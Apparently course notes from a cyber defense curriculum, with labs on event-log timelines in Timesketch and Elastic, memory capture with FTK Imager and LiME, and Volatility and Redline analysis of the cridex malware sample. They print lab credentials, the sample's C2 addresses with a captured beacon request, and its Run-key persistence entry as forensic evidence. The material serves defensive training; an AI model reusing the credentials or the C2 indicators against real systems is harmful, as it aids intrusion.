![image](https://github.com/user-attachments/assets/12578a40-0122-41e5-96bf-27c9d699b272)

The page reloads and shows that the timeline is being indexed; that is, it is being read into Timesketch. This requires approximately 30 seconds.


7. Once the screen no longer displays Indexing in progress, select Begin to explore your data:


![image](https://github.com/user-attachments/assets/54044e1e-eadb-4d83-9dd8-52595e4fb536)

8. Initially, no results are displayed. To verify that the data was loaded into Timesketch correctly, enter an asterisk (*) in the search box, and enter:


![image](https://github.com/user-attachments/assets/39f80cdc-10b9-4ea6-b9b9-eb48bc2e3b0b)

Each event highlighted in a given color (orange in the screenshots) can be selected to view more details and to see all the fields that are populated. To see the most useful information without the need to select each event, change the filter to show more columns than the standard Datetime and message fields.


9. Select Customize columns, and add the columns display_name, parser, source, and timestamp_desc. The columns must be added one at a time. 


10. Search through the events for the two suspicious failed login attempts by entering "4625" !message:"trainee" timestamp_desc:"Creation Time" in the search field:



![image](https://github.com/user-attachments/assets/3ddbb45f-120e-4e67-bd0e-495ab94f34ee)

Use this lab to answer the following question.

![image](https://github.com/user-attachments/assets/c0d626ed-4401-4710-aaa6-3822493be03f)


-----------------------


Locate Log Discrepancies via a Timeline
Read the scenario for the following lab, and use the information gained to determine the actions that the malicious actor took. Keep a running log in LibCalc to track the timeline. Then create an analysis timeline showing those events. 
﻿﻿

﻿

Scenario: A malicious actor obtained access to a Windows server, established two methods of persistence on the host, and attempted to cover their tracks. The time range of this activity is 2022-05-26 16:09:00 to 2022-05-26 16:18:00 EST. 

﻿

Complete the steps in the following workflow to verify that needed logs for analysis are captured.

﻿

Workflow
﻿


1. Log in to the VM win-hunt using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. Open FTK® Imager to begin the forensic examination. User Access Control (UAC) appears, as this application is being run with administrative privileges. Select Yes to open FTK Imager.

﻿

3. Add the forensic image E:\winserv.001 into FTK Imager: 

﻿
![image](https://github.com/user-attachments/assets/46a87bb6-8cdf-4a15-85ca-b8877c7231fd)

![image](https://github.com/user-attachments/assets/5666f204-34ee-41ea-9fc0-dac6409f2c99)

4. Expand winserv.001 to Partition 2/Windows [NTFS]/[root]/Windows/System32/winevt/Logs:

![image](https://github.com/user-attachments/assets/089652e0-6125-44a7-8914-5f74bb9a8888)

![image](https://github.com/user-attachments/assets/120de8e8-8fbb-4fdd-b910-1c628dd60a11)


5. Search for the following logs in the Logs directory:
System
Security
Microsoft-Windows-Sysmon%4Operational.evtx
Microsoft-Windows-WMI-Activity%4Operational
Microsoft-Windows-TaskScheduler%4Operational
Microsoft-Windows-PowerShell%4Operational


The above event logs are not present in the forensic image. This indicates that the attacker potentially attempted to cover their tracks; it also shows the importance of sending logs to Elastic before they can be cleared locally. 


NOTE: Alternatively, this log data can be extracted by obtaining a timeline from the forensic image.


Before creating the timeline, the logs in Elastic should be verified to ensure that the above logs have been captured and are available for analysis even though they are not present in the forensic image. 


6. Open Chrome, and select the Discover - Elastic bookmark.



7. Select Advanced, and on the page stating Your connection is not private, select the link to Proceed to 199.63.64.92 (unsafe).


NOTE: The message Your connection is not private appears because the Security Onion certificate is not installed in the browser; it is not a security concern. 


8. Log in to Elastic using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!



9. Set the Kibana filter dates as May 26, 2022 @ 16:08:00.000 to May 26, 2022 @ 16:18:00.000.


10. Query for the hostname of the device being analyzed to filter the logs, using agent.name:dc01.


11. Change the view filter to see only the Windows Event Logs. In the search box, enter event.module. Select the plus (+) icon to the right of event.module to add the field as a column. 


![image](https://github.com/user-attachments/assets/7e5ff169-f9e1-4b18-bf24-9dc468f2b797)

![image](https://github.com/user-attachments/assets/3cb6b659-15e2-409c-a3c9-6b274fc354d5)


12. Search for the fields event.provider, winlog.channel, and winlog.event_id, and add them as available columns.


NOTE: The winlog.event_id shows a warning icon, but the lab works properly, regardless.


![image](https://github.com/user-attachments/assets/212ec0f5-a9da-4fdc-aafd-1427c29e3745)

13. Search for the sysmon events using the query event.module:"sysmon" to confirm they are available in Elastic.


Logs were cleared from the forensic image but are present in Elastic. If, in this scenario, logs were not being sent to Elastic, all these events would appear not to be available for analysis. Also, Elastic is capturing only Windows Event Logs, not others. This is where the creation of a timeline of the forensic image is needed.


Complete the steps in the following workflow to create a timeline of the forensic image.


Workflow


1. Log in to the VM ubuntu20 using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open a Terminal, and run the following command to go to the Lab2 folder on the desktop:

cd ~/Desktop/Lab2



A complete timeline for a Windows server is located in the Lab2 folder. The timeline file is large and would require significant time to investigate. 


3. Run the following command to generate a smaller timeline that includes only the window of time during which the malicious activity occurred. The timeline generation requires about 15 minutes to complete.

psort.py -q 20220701T160413-winserv.001.plaso "date > '2022-05-26 20:09:00' and date < '2022-05-26 20:18:00'" -w filtered.csv --output_time_zone EST5EDT




4. Open Firefox, browse to localhost, and select Logout in Timesketch. (This is necessary to avoid a Cross-Site Request Forgery [CSRF] token error, which may occur when Timesketch remains dormant for several minutes.)

http://localhost




5. Log in to Timesketch using the following credentials:
Username: trainee
Password: CyberTraining1!



6. Select New Investigation, and name it filtered date range.


7. Upload the filtered.csv file from /home/trainee/Desktop/Lab2/ into Timesketch.


8. Once indexing is complete, select Begin to explore your data and enable the filters Datetime, message, display_name, parser, source, and timestamp_desc.


9. Begin analyzing the events in Timesketch (in the VM ubuntu20) and Elastic (in the VM win-hunt) to identify eight events that indicate malicious behavior. To scope the search, the events contain the following:
Logins/failures
Scheduled tasks
Windows Management Instrumentation (WMI)
Services
Remote access
A malicious binary


These events cannot be found in the forensic image and rely on Elastic or the timeline to discover them. As a reminder, Elastic contains only Windows Event Logs, and Timesketch has information, such as file table information, registry events, and web history, that Elastic does not.


10. Create an analysis timeline that outlines the events discovered in chronological order.


Use this lab to answer the following question.

![image](https://github.com/user-attachments/assets/515285ff-2564-400c-b7db-79672597efb9)

![image](https://github.com/user-attachments/assets/20194c4f-2c0d-4941-908b-6636ae0c9dd1)

![image](https://github.com/user-attachments/assets/45a447a7-7c32-433d-a1bb-508fd42887d7)

![image](https://github.com/user-attachments/assets/104fd573-a6ab-4b85-85ce-f2b43a45b8b2)


------------

### CDAH-M18L1-Forensic Memory Acquisition ###


Memory Acquisition Overview
Memory acquisition is a high-level, inclusive term that applies to duplicating the contents of volatile memory to nonvolatile memory. Memory acquisition includes such techniques as memory capturing, dumping, and sampling. 

﻿

Volatile Memory
﻿

Volatile memory is information that is maintained and used only when the host is powered on. When the host loses power, the information in volatile memory is lost. Random Access Memory (RAM), which maintains program information and data while the host is running, is an example of volatile memory. Cyber defenders must keep volatile memory a priority when responding to an incident. Often, powering down an infected host can be a first step in responding to an incident. However, once power is removed, useful data in the host’s volatile memory is lost. 

﻿

Nonvolatile Memory
﻿

Nonvolatile memory is the opposite of volatile memory: the information is retained when the host is powered off. Nonvolatile memory requires power while storing the data. However, to maintain the data, power is not required. Read-Only Memory (ROM), which holds such information as host startup protocols, is an example of nonvolatile memory.

﻿------------

 Memory Dumping Formats
Memory dumping, also referred to as a core dump or system dump, is the technique of capturing a snapshot of a host’s volatile memory at a certain point in time. A memory dump includes data from such sources as RAM. Cyber defenders use the data collected from the memory dump to help with responding to and investigating an incident. Memory dumps are executed in numerous formats. The following describes common memory dump formats.

﻿

Raw
﻿

A raw format memory dump is extracted from a live environment. A .raw file contains uncompressed and unprocessed data captured from the host. When memory is dumped using the raw format, the data does not contain a header, metadata, or supporting information. 

﻿

Crash Dump
﻿

A crash dump is a memory dump of information collected by the Operating System (OS). The Windows OS, by default, collects information about the system in the event of a system crash. A crash dump contains information about the host’s physical memory.  

﻿

Hibernation File
﻿

A hibernation file is a snapshot of the host’s memory that the OS can return after a hibernation period. The hibernation file, hiberfil.sys, is a binary file located in the root directory (%SystemDrive%/hiberfil.sys). If hibernation is enabled on the host, the file is captured when an image, or copy, of the Hard Disk Drive (HDD) or Solid-State Drive (SSD) is created.

﻿

Page File
﻿

A page file, also referred to as a swap file, is a reserved portion of the host’s hard disk used for RAM. Any data that has not been used by the RAM for a defined period of time resides in the page file. The page file operates as an extension of RAM. 

﻿

Virtual Snapshot
﻿

A virtual snapshot is a saved state of a Virtual Machine (VM) as a specific point in time. A VM snapshot allows users to re-create the VM in the exact state in which the snapshot was captured. 


-----------

Information Stored in RAM

The majority of memory dumping techniques are centered around maintaining or recovering the information stored in RAM. The following information is commonly found in RAM.

﻿

Processes and Executables
﻿

RAM is used to access information quickly by processes and executables running on the host. When memory is dumped, data about which processes and executables were active at the time of the dump is obtained. 

﻿

Networking
﻿

RAM contains a large amount of information about network connections with the host. Network information includes open ports and Internet Protocol (IP) address connections.

﻿

File and User
﻿

RAM contains information regarding users that are logged on to the host. RAM also contains information regarding files that are open on the host and the user that accessed the files.

-------------


Memory Dump Collection Tools
Memory dumping tools exist to dump a host’s RAM based on the OS. The following are common memory dumping tools; they offer simple and effective utilities to complete the memory dump.

﻿

FTK® Imager
﻿

FTK Imager (where FTK means Forensic Toolkit) is a data preview and imaging tool that allows quick access to electronic data and evidence. Through a simple-to-use User Interface (UI), FTK Imager allows for quick and effective collection of a memory dump from the host.  FTK Imager is available on Linux, Windows, and macOS.

﻿

LiME
﻿

Linux Memory Extractor (LiME) is a Loadable Kernel Module (LKM) enabling users to access, collect, and extract volatile memory on hosts running the Linux OS. LiME reduces interactions between the user and kernel space, which maximizes the amount of memory preserved.

﻿

ProcDump
﻿

ProcDump is a command-line utility included in Windows Sysinternals and available on hosts running the Windows OS. ProcDump monitors the Central Processing Unit (CPU) for spikes in memory usage. If a spike in usage occurs, ProcDump generates crash dumps during the spike. 

﻿

Goldfish
﻿

Goldfish is a macOS forensic tool that enables users to access, collect, and extract volatile memory.  

﻿
------------


Memory Dump Analysis Tools
Memory dumping tools exist to analyze the data collected during a memory dump. The following are common memory dump analysis tools.

﻿

Volatility
﻿

Volatility is a free, open-source memory analysis tool. Volatility is supported by The Volatility Foundation, a nonprofit organization aimed at promoting memory analysis within the cyber forensic field. Volatility is a collection of tools and functions, implemented using Python, to extract data from the host’s volatile memory. Volatility is available on Windows, Linux, and macOS. 

﻿

Redline®
﻿

Redline is a free endpoint security tool developed by FireEye. Redline enables users to conduct memory and file analysis within the Windows OS. When a memory dump is collected, the payload is uploaded to Redline for analysis and review. 



-------------

Collect a Memory Dump
In the following lab, collect two memory dumps: one on a Windows OS and one on a Linux host.

﻿

Complete the steps in the following workflow to access the FTK Imager UI and collect a memory dump for a Windows host.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) ls-wkstn-3 using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿

2. Select the FTK Imager icon on the taskbar:


![image](https://github.com/user-attachments/assets/cc3ae203-e420-4c65-bf3b-cfe9712680bf)


3. Select Yes when the prompt Do you want to allow this app to make changes to your device? appears.


4. Within FTK Imager, select File, and select Capture Memory…. 


NOTE: A Capture Memory icon is also located on the toolbar:

![image](https://github.com/user-attachments/assets/f5285267-6844-4c43-8cde-e31fa8e8a3a2)

5. Within the Memory Capture dialog box, under Destination Path, select Browse.


6. Create a new folder on the path E:/Evidence, and name the folder Memory Dump.


NOTE: In the field, RAM data is typically dumped into a separate drive on the host. In this host, the E: drive is used for evidence collection. During an investigation, it is imperative to record the time, date, and description of the device when the memory dump is collected. 


7. In the Destination filename input field, enter memdump1.mem.


8. Select Capture Memory.


FTK Imager captures a memory dump of the host’s RAM. The memory dump requires up to 5 minutes to complete. 


9. When the memory dump is complete, select Close. 


10. Navigate to the newly created folder on the path E:/Evidence. The folder contains the memdump1.mem file. The .mem file type contains the RAM data at the time and date the memory dump was collected. The size of the .mem file varies, based on the data collected from the host’s RAM. However, the file size commonly reaches gigabytes (GB). 


Complete the steps in the following workflow to access LiME and collect a memory dump for a Linux host.


Workflow


1. Log in to the VM it-maint-0 using the following credentials:

Username: trainee
Password: CyberTraining1! 



2. Open Terminal.


3. Navigate to the directory /opt/LiME to access LiME.


4. Enter the following command to view the contents of the folder:

ls



5. Navigate to the /opt/LiME/src folder.



The src folder contains multiple files, one of which is the makefile. The makefile is the assembly instructions for creating a kernel module. The kernel module, a .ko file, is loaded to extract the memory dump from the Linux host. 


6. To create the kernel module, enter the following command within the src folder:

sudo make



When prompted, enter the password for the trainee account:

CyberTraining1!



The make command returns a large amount of output. The bottom of the output contains the newly created kernel module, lime-5.13.0-39-generic.ko.


7. To load the newly created kernel module, enter the following command:

sudo insmod ./lime-5.13.0-39-generic.ko "path=/opt/LiME/t.mem format=lime"




The Linux OS allows users to load kernels. The insmod command in Linux systems is used to insert modules into the kernel. 


The command above loads ./lime-5.13.0-39-generic.ko to execute the memory dump. The results of the memory dump are in a newly created .mem file located on the path /opt/LiME/t.mem. The format of the memory dump is LiME.


8. To verify that the kernel loaded properly, execute the following command:
lsmod | grep lime



The output is as follows:
lime      16384 0 



The file size — 16,384 megabytes (MB) — is the same size as the RAM of the host, indicating that the kernel was loaded properly. 


9. To verify that the memory dump was executed correctly, run the following command to view the opt/LiME directory:
ls /opt/LiME

 
The memory dump is located within the t.mem file in the directory. 



--------------


Prepare for a Forensic Investigation
A CPT has been tasked with completing a forensic investigation across a range of hosts. Included in the investigation are three Windows hosts, two Linux hosts, and one macOS host. It is necessary that the volatile memory of the hosts is acquired through a memory dump. Use the knowledge and skills gained throughout the lesson to help the CPT successfully acquire the data. 

﻿

Workflow
﻿

1. Answer the following knowledge questions to aid the CPT in preparing for the forensic investigation.


![image](https://github.com/user-attachments/assets/c235f31a-0106-4b2a-827f-562990d317d1)

![image](https://github.com/user-attachments/assets/1f86f82f-d19c-4174-bef1-2a20e5598932)

![image](https://github.com/user-attachments/assets/568e110f-104c-4856-be26-01ab0bff515b)

![image](https://github.com/user-attachments/assets/b40da021-c0ba-4653-836f-76ea0859b3ec)

![image](https://github.com/user-attachments/assets/1e97d319-86d4-44fd-b849-72c46cbc8ede)

![image](https://github.com/user-attachments/assets/2cb9720a-b8ba-4c17-a9a1-84458b5ac38e)

![image](https://github.com/user-attachments/assets/1e1cfc94-c2cb-402b-8168-01e40183dcd7)


-------------------

### CDAH-M18L2-Analyzing a Forensic Memory Acquisition ###

Malicious Indicators in Memory
Analysis of forensic memory acquisitions allows an investigator to uncover information about running processes, process Dynamic Link Library (DLL) files and handles, evidence of code injection, Windows registry changes, network communications, and more. Much of this information is unavailable from disk analysis alone, making memory forensics of high value for greater insight into any potentially malicious activity on a host.

﻿

Identifying Malicious Activity in a Memory Acquisition
﻿

A memory acquisition has the potential to contain a wide variety of information about the system from which the acquisition was taken as well as forensic artifacts stored in Random Access Memory (RAM). The exact nature of the artifacts stored and what is available to an investigator varies, based on multiple factors, such as the state of the system and how the acquisition was taken.

﻿

When hunting for indicators of malicious activity in a memory acquisition, several areas of interest may contain evidence to support an investigation. For example, enumeration of all running processes allows for the identification of suspicious process names and processes running in nonstandard locations (especially those with suspicious parent processes) and provides the ability to extract any files stored in memory that are associated with a specific process.

﻿

Analyzing Processes in a Forensic Memory Acquisition
﻿

Indicators of Compromise (IOC) can be found in multiple locations in a memory acquisition. Every program, whether malicious or benign, must be fully loaded into memory to execute on a system. Analysis of running processes reveals the names of these programs. This is often a great place to start an analysis.

﻿

For example, if a process named transmission-q were discovered in a memory acquisition, this would indicate that some user on that system instantiated the Transmission BitTorrent client. This might lead to evidence of a data leak if the user (or malicious program) is exfiltrating sensitive data. The nature of the communication used by this program can be discovered through analysis of process memory.

﻿

Analyzing Process Memory
﻿

If a memory acquisition can be thought of as the entirety of the ocean in terms of the total memory in use by a system, then process memory can be thought of as the division of depth as processes claim portions of the entire memory space. A deep dive into memory forensics uncovers separate addressable memory locations in use by different processes. Focusing on these specific locations makes it easier for the analyst to uncover the behaviors exhibited by each process.

﻿

Considering the previous example of the BitTorrent client process transmission-q, the memory space claimed by this process can be carved out from the entirety of the memory acquisition to reveal such details as what data is included in the BitTorrent communication. In this case, a tracker is included in BitTorrent communication to allow the client process to facilitate communication between two or more computers in peer-to-peer file sharing, such as http://tracker.virusshare.com:6969/torrents/VirusShare_00422[.]zip.

﻿

At first glance, this ZIP file may seem malicious, as the word virus is prominent and the torrent file is a ZIP archive. The file could indeed be malicious: although virusshare.com is a legitimate website offering malware files for research purposes, the contents of VirusShare_00422.zip are various malware samples. When the malware is extracted from an archive, a careless user could potentially execute it and infect their system. 

﻿

In addition to carving out the addressable memory space for a process, the process can be extracted for further analysis. Because an executable file must be loaded into memory as a process in order to carry out its commands, this same executable can be extracted from the memory acquisition for file analysis through reverse engineering, dynamic analysis, and file hash lookups for known malware.

﻿

Analyzing Network Activity
﻿

Memory acquisitions can describe network communications that were active at the time the memory acquisition was taken. In addition to the prior BitTorrent communication example, communication with external Internet Protocol (IP) addresses can be enumerated for further analysis. Inclusion of a known malicious IP in these communications would certainly be an IOC. All network activity should be analyzed for suspicious activity, including the use of nonstandard ports and ports associated with applications that are not approved for the system under investigation.

﻿

Identifying Malware Persistence
﻿

Malware can be discovered in a memory acquisition through analysis of addressable memory used by suspicious processes. A process containing malicious code is volatile, meaning that once the process ends, the capability of exfiltrating data, recording keystrokes, and other malicious activities ends as well. To maintain a live presence on an infected system, malware often uses persistence techniques, such as adding a reference to malicious code in the Windows registry. This allows the malware to instantiate each time the infected system is restarted. Identification of persistence mechanisms used by malware on an infected system allows incident responders to perform a more thorough cleaning of the system and provide an additional IOC when scanning a network for infected systems.

﻿

The following sections describe the use of two tools for analyzing memory acquisitions: Volatility and Redline.

![image](https://github.com/user-attachments/assets/f37b9ed4-ba47-4018-b3ff-6c551390c233)


------------

Analyze a Memory Acquisition with Volatility
In the following workflow, perform forensic memory analysis using Volatility to discover IOCs.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) sift using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Terminal.

﻿

3. Navigate to the acquisitions folder by entering the following command:

cd acquisitions/
﻿

The acquisitions folder contains a memory acquisition file named cridex.vmem. To investigate this memory acquisition with Volatility, it is first necessary to identify which Operating System (OS) profile to use. Volatility needs this information to interpret the format of data in a memory acquisition. By not specifying a profile (or specifying an incorrect profile for the OS associated with the memory acquisition), Volatility would be unable to properly analyze the file. 

﻿

4. Enter the following command to identify the appropriate OS to use:


vol.py -f cridex.vmem imageinfo
﻿

Part of the output identifies the profile to use, as follows:


Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
﻿

In this case, WinXPSP2x86 is the profile necessary for the successful execution of the program, indicating that the system from which this memory acquisition was taken had a 32-bit Windows XP OS with Service Pack (SP) 2.

﻿

An important first step in memory acquisition analysis is the enumeration of running processes. Volatility can list the processes it can identify as being live in memory, allowing the analyst to observe the relationships between processes (parent and child processes, for example) as well as any odd process names that might be suspicious. 

﻿

5. Enter the following command to acquire the process list:


vol.py -f cridex.vmem --profile WinXPSP2x86 pslist
﻿

Several processes are listed in the output of the above command. The process named reader_sl.exe is of interest. If this executable is legitimate, it is likely a process known as SpeedLauncher associated with Adobe Acrobat. This could be a legitimate process, but it is worth noting that the parent process for reader_sl.exe is explorer.exe. This suggests that a user process resulted in the execution of reader_sl.exe. This situation is worth investigating further.

﻿

If malware is within this memory acquisition, a possibility exists that the malware has made a network connection to a remote system for Command-and-Control (C2) functionality. Active Transmission Control Protocol (TCP) network connections can be observed through the connscan Volatility plug-in. 

﻿

6. Enter the following command to invoke the connscan plug-in:


vol.py -f cridex.vmem --profile WinXPSP2x86 connscan
﻿

The results of the above command show that the local address for the system this memory acquisition was taken from is 172.16.112.128. There are two active connections in memory to the external addresses 41.168.5.140 and 125.19.103.198, with both communicating over port 8080 and with a Process Identifier (PID) of 1484 — the same PID as the explorer process that is the parent process of reader_sl.exe. This could be an indicator of malware running in memory communicating with an external malicious host.

﻿

Given the previous indicators of a possible malware infection, Volatility’s yarascan plug-in can be used to identify known patterns of malware behavior. If yarascan returns matching behavior, this can increase confidence that a process in memory is malicious. 

﻿

7. Enter the following command to invoke the yarascan plug-in:


vol.py -f cridex.vmem --profile WinXPSP2x86 yarascan -y malware_rules.yar -p 1484 | sort | uniq
﻿

The above command tells Volatility to scan the memory acquisition with YARA, comparing patterns of behavior with signatures found in the file malware_rules.yar. The specification of PID 1484 focuses the YARA analysis on the explorer process identified previously. The results are piped to sort and uniq, which makes the output more readable. Examination of the output reveals the following:


Owner: Process explorer.exe Pid 1484
Rule: FVEY_ShadowBrokers_Jan17_Screen_Strings
﻿

This output states that a behavior pattern found within the activities in memory for PID 1484 matches a YARA rule for malicious behavior.

﻿

Because YARA identified malicious behavior in the explorer process with PID 1484, further analysis of which other processes associated with PID 1484 can be performed through the pstree plug-in.

﻿

8. Enter the following command to invoke the pstree plug-in:


vol.py -f cridex.vmem --profile WinXPSP2x86 pstree | grep 1484
﻿

The output of the above command shows that the only child process of PID 1484 is PID 1640: reader_sl.exe. 

﻿

Volatility allows for the extraction of an executable from a memory acquisition, such as reader_sl.exe. Because the PID for this executable is known, the following command can be used:


vol.py -f cridex.vmem --profile WinXPSP2x86 procdump -p 1640 –-dump-dir .
﻿

9. Run the command above.

﻿

The above command extracts reader_sl.exe to the current directory with the file name executable.1640.exe. This file may then be analyzed separately in a dynamic analysis sandbox, or the file hash value may be searched for within a known malware information repository, such as VirusTotal. This lab does not include this process, but the result is that reader_sl.exe is identified as a malware trojan.

﻿

Additionally, the addressable memory of the reader_sl.exe process can be extracted for further analysis using the following command:


vol.py -f cridex.vmem --profile WinXPSP2x86 memdump -p 1640 --dump-dir .
﻿

10. Run the command above.

﻿

The above command results in the creation of 1640.dmp, which can be further analyzed through strings to gather additional information:


strings 1640.dmp
﻿

This results in a significant amount of information and is difficult to parse without knowing what to look for. However, the external IP addresses 41.168.5.140 and 125.19.103.198 were previously identified through the connscan plug-in. A search for 125.19.103.198 in the memory dump for the process yields no results, but the following command provides interesting information:


strings 1640.dmp | grep “41.168.5.140” -C 5
﻿

11. Run the command above.

﻿

The above command results in the following:


POST /zb/v_01_a/in/ HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
Host: 41.168.5.140:8080
Content-Length: 229
Connection: Keep-Alive
Cache-Control: no-cache
﻿

The above results show that the reader_sl.exe process communicates out to 41.168.5.140 over port 8080. This matches the communication observed through connscan and is an IOC.

﻿

With knowledge that reader_sl.exe is malicious and communicates with an external IP, further investigation is worthwhile to determine if the malware is employing any persistence techniques. By doing so, additional IOCs can be found for identifying malicious artifacts on other systems. Volatility’s filescan plug-in searches the memory acquisition for references to file objects located on a system. In this case, interesting information can be gathered by focusing on executable files.

﻿

12. Run the following command to gather information about executable files:


vol.py -f cridex.vmem --profile WinXPSP2x86 filescan | grep exe
﻿

The following result from the above command is particularly interesting:


0x00000000024abd80  1  0 R--rw- \Device\HarddiskVolume1\Documents and Settings\Robert\Application Data\KB00207877.exe
﻿

This KB00207877.exe file in the result stands out because it is located in a user’s directory and uses Microsoft’s Knowledge Base (KB) naming scheme for an executable usually reserved for software patches. This is an odd location for the file to exist, warranting further investigation.

﻿

13. To determine if a relationship exists between KB00207877.exe and the malicious reader_sl.exe, analyze the strings in the 1640.dmp file by running the following command:


strings 1640.dmp | grep "KB00207877.exe"
﻿

The results of the above command show that references to KB00207877.exe exist in the memory of the reader_sl.exe process. This means that a connection, and a further IOC, does exist.

﻿

14. Run the following command to extract KB00207877.exe from the memory acquisition for further analysis using the dumpfiles plug-in:


vol.py -f cridex.vmem --profile WinXPSP2x86 dumpfiles --dump-dir . -Q 0x00000000024abd80
﻿

The -Q 0x00000000024abd80 specifies the memory offset that points to the KB00207877.exe file, as shown in the filescan output. As with reader_sl.exe, this file can also be identified as a malware trojan through further analysis. Given the naming convention used by the malware to hide itself as a benign program, it may be assumed that KB00207877.exe is used for persistent execution on a victim computer.

﻿

One common persistence technique used by malware is to abuse the Windows registry so that a malicious executable is run every time the Windows OS starts up. Volatility is capable of inspecting the Windows registry in a memory acquisition through the printkey plug-in.

﻿

15. Run the following command to invoke the printkey plug-in:


vol.py -f cridex.vmem --profile=WinXPSP2x86 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
﻿

The above command results in a definitive reference to the malicious KB00207877.exe, as shown below:


Registry: \Device\HarddiskVolume1\Documents and Settings\Robert\NTUSER.DAT
Key name: Run (S)
Last updated: 2012-07-22 02:31:51 UTC+0000

Subkeys: 

Values:
REG_SZ        KB00207877.exe  : (S) "C:\Documents and Settings\Robert\Application Data\KB00207877.exe"
﻿

The above results lead to the conclusion that KB00207877.exe is used to persistently execute malicious code on the infected system through a startup registry key.

﻿

The following summarizes the forensic analysis of the memory acquisition through Volatility:

The imageinfo plug-in was used to identify the necessary Windows OS profile to use for analysis of the acquisition.
pslist was used to identify the processes running in memory.
connscan was used to enumerate active network connections.
yarascan was used to fingerprint known malicious activity.
pstree was used to observe the relationships between parent and child processes.
procdump extracted the malicious reader_sl.exe file from memory.
memdump extracted the addressable memory used by reader_sl.exe.
The strings command was used to identify that reader_sl.exe was responsible for communication channels out to external IP addresses identified through connscan.
An additional malicious executable was discovered using filescan.
KB00207877.exe was extracted from memory using dumpfiles.
KB00207877.exe was identified as the persistence mechanism used by the malware through examination of the Windows registry startup key through printkey.

This resulted in the identification of malware within the memory acquisition as well as several forensic artifacts for use in further analysis across other systems in the network.

﻿

Use this workflow to answer the following questions.

![image](https://github.com/user-attachments/assets/12a21870-3647-4837-a429-f06b8ac7f8b6)

![image](https://github.com/user-attachments/assets/07ef90dc-ec9f-4a5a-bbc6-76e41f56f80f)
![image](https://github.com/user-attachments/assets/4faea22f-91bc-45e8-9fd2-fd77460be83d)
![image](https://github.com/user-attachments/assets/443e0f97-0260-4f16-ab8a-c6d7d85430cf)
![image](https://github.com/user-attachments/assets/37969a71-7055-4844-b560-8afc2a39641d)
![image](https://github.com/user-attachments/assets/ef791028-6c19-4308-aa55-c1082bd9f1e6)
![image](https://github.com/user-attachments/assets/081c2f20-feae-41f0-8804-fc291a54e6ce)

--------------

Analyzing a Memory Acquisition with Redline
In the following workflow, perform forensic memory analysis using Redline to discover IOCs.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Redline.

﻿

3. Under Analyze Data, select From a Saved Memory File.

﻿

4. Under Configuration, select the first Browse button, under Location of Saved Memory Image.

﻿

5. Select the file cridex.vmem for analysis, located in the Downloads folder. By default, the file type searched for is Memory Images. Change the selection to All Files (“.”) in the lower right corner, and select Next.

﻿

6. Select Edit your script under Review Script Configuration. Check the boxes labeled Strings under Process Listing and Drivers Enumeration. Select OK for the script configuration and analysis session. If prompted, allow MandiantToolkit.Utils.Uac to make changes to the computer. 
This may take several minutes to complete.

﻿

7. Select Hierarchical Processes under Analysis Data in the left menu bar. 

﻿

Each process in the memory acquisition is displayed, showing the relationships between parent and child processes. 

﻿

8. Double-click Explorer.EXE with PID 1484.

﻿

An analysis window for this process opens, with several tabs at the bottom to select different types of information. 

﻿

9. Select the tab labeled Ports. This shows that this process has an established connection with the external IP 41.168.5.140 over port 8080.

﻿

10. Select Processes under Analysis Data in the left menu bar. Double-click the process Reader_sl.exe. 

﻿

An analysis window for this process opens. 

﻿

11. Select the tab labeled Strings, and search for 41.168.5.140. 

﻿

A match appears, showing that a direct reference to this IP address exists within the Reader_sl.exe process.

﻿

12. Right-click the process name under Processes, and select Acquire this Process Address Space. 

﻿

13. Acquire the address space for the process named alg.exe, and select Yes when prompted by User Account Control. 

﻿

14. To view the status of the acquisition, select View Background Tasks in the message at the bottom of the screen stating that acquisition has begun.

﻿

15. When the acquisition is complete, select Acquisition History under Analysis Data to view the acquisition list. 

﻿

The file path to the acquisition is displayed. 

﻿

16. Select the path displayed. 

﻿

File Explorer navigates to the folder containing the dumped process memory space. Several files are contained in the acquisition folder when extracted from the archive. These folders may be analyzed separately and are not covered in this lab, as they are not malicious. (alg.exe is associated with the Windows Application Layer Gateway Service and is used as an example for this procedure.)

﻿

This process may be repeated for the Reader_sl.exe process to extract the malicious executable. However, Windows Defender blocks this extraction due to the detection of malware. If Windows Defender is configured to ignore the folder locations where acquisitions are stored, the process memory space for Reader_sl.exe can be analyzed as well. The procedure for configuring Windows Defender is not covered in this lab. However, the malware detection is a clear IOC within this memory acquisition.

﻿

The Reader_sl.exe file is clearly malicious, and further investigation into the strings collected by Redline can provide more information relevant to the compromise. 

﻿

17. Select the Reader_sl.exe process from Processes, and double-click the process name. 

﻿

18. Select the Strings tab from the bottom of the screen. 

﻿

19. A wealth of information (16,532 items) is available, but for the purposes of this lab, select the filter underneath the String column heading, and apply a filter for any string that contains a string value of .exe to search for any references to executable files. 

﻿

The total results are reduced to just 45 items and can be examined manually more easily. Within these results, KB00207877.exe can be found. As in the Volatility examination, this file name stands out as suspicious, as it uses a nomenclature usually reserved for Microsoft software patches. A reference to such a file within a known malicious executable is of concern.

﻿

Further references to KB00207877.exe can be found by searching through the total number of strings that Redline identified for all processes in the memory acquisition. 

﻿

20. Under Analysis Data, expand Processes, and select Strings.

﻿

21 Search for KB00207877.exe. 

﻿

Fifteen matches are returned, including references to the C:\Documents and Settings\Robert\Application Data folder. This reveals that the suspicious executable KB00207877.exe associated with the known malicious process Reader_sl.exe communicating with an external IP 41.168.5.140 over port 8080 is affiliated with the user account Robert.

﻿

Redline can analyze the Windows registry, enumerate user accounts, and return web browser history to add additional IOCs when analyzing a memory acquisition. However, the full features of Redline are available when the memory acquisition is performed by Redline and not by other tools. Because the cridex.vmem memory acquisition was not collected using Redline, not all these features are present for this lab. Even so, Redline is effective at memory analysis and is a great alternative to Volatility.

![image](https://github.com/user-attachments/assets/69a4d3b7-973d-4f48-9e87-ec75da7d83b1)
